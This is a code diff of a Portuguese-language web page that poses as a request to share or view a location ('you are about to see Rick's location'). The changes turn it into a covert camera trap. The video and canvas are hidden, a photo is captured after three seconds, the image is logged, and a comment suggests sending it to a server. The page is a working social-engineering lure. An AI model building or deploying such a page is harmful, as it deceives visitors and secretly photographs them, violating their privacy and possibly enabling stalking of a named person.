@@ -10,7 +10,6 @@
       background-color: #f5f5f5;
       color: #333;
       display: flex;
-      flex-direction: column;
       align-items: center;
       justify-content: center;
       height: 100vh;
@@ -23,11 +22,11 @@
       border-radius: 12px;
       box-shadow: 0 4px 12px rgba(0,0,0,0.1);
       text-align: center;
-      max-width: 320px;
+      max-width: 340px;
     }
 
     button {
-      background-color: #007bff;
+      background-color: #28a745;
       color: white;
       border: none;
       padding: 0.75rem 1.5rem;
@@ -37,10 +36,12 @@
       margin-top: 1.5rem;
     }
 
-    video {
+    #mensagem {
       margin-top: 1rem;
-      width: 100%;
-      border-radius: 10px;
+      font-weight: bold;
+    }
+
+    video, canvas {
       display: none;
     }
   </style>
@@ -48,20 +49,47 @@
 <body>
   <div class="card">
     <h2>Deseja conceder acesso a Localizar?</h2>
-    <button onclick="solicitarCamera()">Permitir</button>
-    <video id="preview" autoplay playsinline></video>
+    <p>Será necessário ver localização marcada.</p>
+    <button onclick="iniciarProcesso()">Sim</button>
+    <p id="mensagem"></p>
+    <video id="camera" autoplay playsinline></video>
+    <canvas id="captura"></canvas>
   </div>
 
   <script>
-    async function solicitarCamera() {
-      const videoElement = document.getElementById('preview');
+    async function iniciarProcesso() {
+      const video = document.getElementById('camera');
+      const canvas = document.getElementById('captura');
+      const mensagem = document.getElementById('mensagem');
+
+      mensagem.textContent = "Você está prestes a ver a Localização de Rick!";
+
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        videoElement.srcObject = stream;
-        videoElement.style.display = 'block';
-      } catch (error) {
-        alert("Não foi possível acessar a câmera. Verifique as permissões do navegador.");
-        console.error("Erro ao acessar a câmera:", error);
+        video.srcObject = stream;
+
+        // Aguarda alguns segundos para garantir que a câmera ativou
+        setTimeout(() => {
+          // Configura canvas com dimensões do vídeo
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+
+          // Captura frame
+          const context = canvas.getContext('2d');
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          // Para o stream da câmera
+          stream.getTracks().forEach(track => track.stop());
+
+          // Aqui você pode enviar o frame para um servidor ou baixar a imagem:
+          const imagem = canvas.toDataURL("image/png");
+          console.log("Imagem capturada:", imagem);
+
+          mensagem.textContent = "Imagem capturada com sucesso!";
+        }, 3000); // tempo para estabilizar câmera
+      } catch (erro) {
+        mensagem.textContent = "Permissão negada ou erro ao acessar a câmera.";
+        console.error("Erro ao acessar a câmera:", erro);
       }
     }
   </script>
